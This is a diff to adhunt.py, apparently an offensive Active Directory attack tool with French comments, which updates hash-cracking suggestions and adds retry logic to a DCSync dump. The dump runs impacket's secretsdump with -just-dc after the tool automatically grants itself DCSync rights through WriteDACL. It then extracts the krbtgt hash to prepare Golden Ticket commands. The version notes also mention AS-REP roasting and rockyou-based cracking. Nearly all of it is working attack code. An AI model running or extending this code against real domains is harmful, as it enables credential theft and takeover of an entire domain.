@@ -2563,7 +2563,8 @@ def crack_hashes(args, state):
                                 "reutilisable -> re-enum (boucle)")
                     new += 1
         # hash non casse automatiquement -> on PROPOSE la commande manuelle (visible ecran)
-        if not creds:
+        # dedoublonne : crack_hashes tourne a chaque phase, on ne re-propose pas en boucle
+        if not creds and not any(u["path"] == path for u in state.get("uncracked", [])):
             state.setdefault("uncracked", []).append({"kind": kind, "path": path, "mode": mode, "fmt": fmt})
             big = "/usr/share/wordlists/rockyou.txt"
             log(f"  {C.Y}{C.BD}[A CRAQUER] {kind} non casse auto -> fais-le a la main :{C.X}")
@@ -2741,19 +2742,29 @@ def dcsync_dump(args, state, dc):
     tgt, extra = impacket_creds(args)
     outb = os.path.join(args.loot, "domain_ntds")
     ntds = outb + ".ntds"
-    try:                       # retire un eventuel dump precedent -> le check reflete CE run
-        os.remove(ntds)
-    except OSError:
-        pass
-    log(f"{C.R}{C.BD}[i] DCSync : dump complet du domaine (secretsdump -just-dc)...{C.X}")
-    rc, out, _ = run_cmd(["secretsdump.py", f"{tgt}@{dc}", "-just-dc", "-outputfile", outb] + extra, 600)
-    if (os.path.isfile(ntds) and os.path.getsize(ntds) > 0) or "krbtgt:" in out.lower():
-        add_finding(state, "CRIT", "DCSync reussi : hashes NTDS du domaine dumpes",
-                    f"{ntds} (krbtgt -> Golden Ticket possible)", dc)
-        state.setdefault("hashes", {})["ntds"] = ntds
-        extract_krbtgt(ntds, state)   # ferme la boucle : krbtgt -> commande Golden Ticket
-    else:
-        log(f"{C.GR}    -> DCSync refuse avec {args.user} (droits insuffisants).{C.X}")
+    # si on VIENT d'octroyer DCSync (auto-escalade), le DC met qq secondes a appliquer la
+    # nouvelle DACL -> on reessaie avec pause (sinon "droits insuffisants" a tort)
+    just_granted = bool(state.get("_dcsync_cleanup"))
+    attempts = 4 if just_granted else 1
+    log(f"{C.R}{C.BD}[i] DCSync : dump complet du domaine (secretsdump -just-dc)"
+        f"{' [attente propagation DACL]' if just_granted else ''}...{C.X}")
+    for i in range(attempts):
+        try:                   # retire un eventuel dump precedent -> le check reflete CE run
+            os.remove(ntds)
+        except OSError:
+            pass
+        rc, out, _ = run_cmd(["secretsdump.py", f"{tgt}@{dc}", "-just-dc", "-outputfile", outb] + extra, 600)
+        if (os.path.isfile(ntds) and os.path.getsize(ntds) > 0) or "krbtgt:" in out.lower():
+            add_finding(state, "CRIT", "DCSync reussi : hashes NTDS du domaine dumpes",
+                        f"{ntds} (krbtgt -> Golden Ticket possible)", dc)
+            state.setdefault("hashes", {})["ntds"] = ntds
+            extract_krbtgt(ntds, state)   # ferme la boucle : krbtgt -> commande Golden Ticket
+            return
+        if i < attempts - 1:
+            log(f"{C.GR}    -> refuse (essai {i+1}/{attempts}), la DACL n'est pas encore "
+                f"appliquee -> pause 6s...{C.X}")
+            time.sleep(6)
+    log(f"{C.GR}    -> DCSync refuse avec {args.user} (droits insuffisants apres {attempts} essai(s)).{C.X}")
 
 # ======================================================================
 # ATTAQUE DE TRUST : child -> parent (SID History / ExtraSids -> Golden Ticket)
@@ -3240,7 +3251,8 @@ def parse_targets(target):
         return [target]
 
 # ----------------------------------------------------------------------
-__version__ = "2.2"        # V2 : recon DNS (SRV/SOA/AXFR), /etc/hosts auto, fix parsing nxc --users
+__version__ = "2.3"        # V2.3 : auto-escalade DCSync (WriteDACL domaine), fix impacket/sudo,
+                           # AS-REP par-user, rockyou.gz, retry propagation DACL, crack manuel propose
 
 BANNER = f"""{C.CY}{C.BD}
   adhunt.py v{__version__} {C.Y}[V2]{C.CY}  -  enumeration Active Directory (tableau de bord vivant){C.X}
